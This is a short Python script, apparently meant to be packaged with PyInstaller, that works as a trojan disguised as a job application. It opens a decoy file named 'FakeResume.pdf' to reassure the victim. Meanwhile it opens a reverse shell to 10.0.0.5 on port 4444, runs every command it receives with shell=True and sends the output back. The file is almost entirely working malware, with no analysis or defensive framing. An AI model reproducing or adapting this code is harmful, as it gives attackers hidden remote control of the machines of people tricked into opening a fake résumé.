import subprocess
import os
import sys
import socket
import threading
import webbrowser


def open_pdf():
    # Determine the correct path to the PDF file
    if hasattr(sys, "_MEIPASS"):
        # Running as a PyInstaller bundle
        base_path = sys._MEIPASS
    else:
        # Running normally
        base_path = os.path.dirname(__file__)

    pdf_path = os.path.join(base_path, "FakeResume.pdf")

    # Open the PDF file
    webbrowser.open(pdf_path)


def connect_back():
    # Your existing reverse shell code here
    s = socket.socket()
    s.connect(("10.0.0.5", 4444))
    while True:
        try:
            # Receive the command
            cmd = s.recv(1024).decode("utf-8")
            if cmd.lower() == "exit":
                break

            # Run the command and get output
            output = subprocess.run(cmd, shell=True, capture_output=True)
            result = output.stdout + output.stderr

            # Send back the result
            if result:
                s.send(result)
            else:
                s.send(b"[+] Command executed but no output.\n")
        except Exception as e:
            error_message = f"[-] Error: {str(e)}\n".encode()
            s.send(error_message)

    s.close()


# Start PDF and reverse shell
threading.Thread(target=open_pdf).start()
connect_back()
